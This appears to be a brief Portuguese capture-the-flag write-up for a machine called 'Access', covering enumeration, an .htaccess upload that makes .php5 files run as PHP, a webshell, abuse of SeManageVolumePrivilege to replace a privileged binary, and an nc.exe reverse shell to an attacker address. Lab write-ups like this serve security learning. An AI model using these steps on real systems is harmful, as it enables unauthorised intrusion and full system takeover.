# Access
> .htaccess upload + SeManageVolume

## Enumeração

```
nmap -sC -sV -oN nmap.txt <IP>
```

```
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

## Exploração

Upload de arquivo `.htaccess` para habilitar execução de PHP:

```
echo 'AddType application/x-httpd-php .php5' > .htaccess
```

Upload de webshell `.php5` e execução de comandos.

## Escalada de Privilégio

```
whoami /priv
```

Privilégio `SeManageVolumePrivilege` habilitado.

```
SeManageVolume.exe
```

Acesso de leitura/escrita ao volume → substitui binário privilegiado.

```
nc.exe <IP> <PORTA> -e cmd.exe
```

Root/SYSTEM obtido.
